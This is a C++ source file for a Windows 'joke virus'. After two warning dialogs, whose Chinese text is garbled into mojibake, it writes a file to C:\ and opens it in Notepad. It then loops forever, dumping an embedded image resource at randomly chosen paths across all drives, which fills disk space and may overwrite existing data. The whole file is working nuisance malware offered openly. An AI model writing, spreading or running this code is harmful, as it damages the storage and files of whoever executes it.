#include<windows.h>
#include<tchar.h>
#include<stdio.h>
#include<time.h>
#include"resource.h"
#include<string>
#include<vector>
#include<io.h>
#include<iostream>
using namespace std;
void ReleaseImage(LPCTSTR path) {
	if (auto rsrc = FindResource(NULL, MAKEINTRESOURCE(IDR_IMG1), _T("img"))) {
		if (auto global = LoadResource(NULL, rsrc)) {
			if (auto lpvoid = LockResource(global)) {
				if (auto size = SizeofResource(NULL, rsrc)) {
					HANDLE hfile = CreateFile(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
					if (hfile != INVALID_HANDLE_VALUE) {
						DWORD dwWritten = 0;
						WriteFile(hfile, lpvoid, size, &dwWritten, NULL);
						CloseHandle(hfile);
					}
				}
			}
		}
	}
}

wstring GetRandomPath() {
	static bool first_run = true;
	static vector<wstring> drives;
	if (first_run) {
		first_run = false;
		TCHAR str[200];
		ZeroMemory(str, sizeof str);
		DWORD result = GetLogicalDriveStrings(200, str);
		if (result > 0 && result < 200) {
			wstring tmp;
			for (int i = 0; i < result; i++) {
				if (str[i] == 0)drives.push_back(tmp), tmp = _T("");
				else tmp += str[i];
			}
		}
	}

	wstring path = drives.at(rand() % drives.size());
	vector<wstring> tmp;
	tmp.push_back(_T(""));
	while (rand() % 10 && !tmp.empty()) {
		tmp.clear();
		_tfinddata_t fileinfo;
		long lf;
		if ((lf = _tfindfirst((path + _T("\\*.*")).c_str(), &fileinfo)) != -1) {
			do {
				
				if (fileinfo.attrib & _A_SUBDIR) {
					if (_tcscmp(fileinfo.name, _T("."))!=0&&_tcscmp(fileinfo.name,_T(".."))!=0)
						tmp.push_back(fileinfo.name);
				}
			} while (_tfindnext(lf, &fileinfo) == 0);
		}
		if (!tmp.empty())
			path = path.append(_T("\\")).append(tmp.at(rand() % tmp.size()));
	}
	return path;
}

//int main(){
int WINAPI _tWinMain(HINSTANCE, HINSTANCE, LPTSTR, INT) {
	srand(unsigned(time(nullptr)));
	if (MessageBox(NULL, _T("����һ�����������\r\n��ȷ��Ҫ������������"), _T("����"), MB_YESNO|MB_ICONERROR) == 6) {
		if (MessageBox(NULL, _T("��󾯸棺\r\n�ó�����ܻ�ռ�ô�����Դ����������ɲ�����ĺ����ȷ��������"), _T("����"), MB_YESNO|MB_ICONERROR) == 6) {
			HANDLE hfile = CreateFile(_T("C:\\tmp.txt"), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (hfile != INVALID_HANDLE_VALUE) {
				DWORD dwWritten = 0;
				const TCHAR str[] = _T("���ܺ���ĵ��ԡ�");
				const BYTE unicodeHead[] = { 0xFF, 0xFE }; //unicode�ļ�ͷ�ļ�
				WriteFile(hfile, unicodeHead, sizeof(unicodeHead), &dwWritten, NULL);
				WriteFile(hfile, str, sizeof str, &dwWritten, NULL);
				CloseHandle(hfile);

				system("notepad.exe C:\\tmp.txt");

				//������ע���Ի�ò���Ч��
				while (1) {
					ReleaseImage(GetRandomPath().c_str());
				}
			}
		}
	}
	return 0;
}